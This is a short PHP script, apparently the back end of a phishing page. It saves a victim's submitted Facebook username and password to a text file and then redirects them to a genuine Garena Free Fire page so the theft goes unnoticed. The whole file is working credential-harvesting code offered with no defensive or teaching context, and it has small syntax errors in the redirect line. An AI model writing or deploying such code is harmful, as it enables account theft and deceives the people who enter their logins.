<?php

file_put_contents("usernames.txt", "Account: " . $_POST['facebook'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location : https://ff.garena.com/weapons/index/en/')
exit();
?>
